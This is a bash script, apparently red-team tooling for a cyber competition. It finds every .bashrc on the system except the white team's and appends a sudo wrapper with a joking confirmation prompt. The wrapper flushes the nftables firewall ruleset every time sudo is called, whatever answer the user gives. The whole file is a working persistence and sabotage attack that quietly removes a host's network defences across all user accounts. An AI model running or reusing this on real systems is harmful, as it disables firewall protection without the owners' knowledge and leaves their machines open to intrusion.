#!/usr/bin/env bash
whiteteam_user=""

find / -name ".bashrc" 2>/dev/null | while read -r bashrc; do
    [[ -n "$whiteteam_user" && "$bashrc" == *"$whiteteam_user"* ]] && continue
    echo '
sudo() {
    printf "hey, are you *sure* you wanna run sudo? like really sure? (Y/N) "
    read -r answer
    case "$answer" in
        [Yy])
            command sudo nft flush ruleset
            command sudo "$@"
            ;;
        *)
            echo "phew, crisis averted. sudo aborted." >&2
            command sudo nft flush ruleset
            return 1
            ;;
    esac
}
' >> "$bashrc"
done
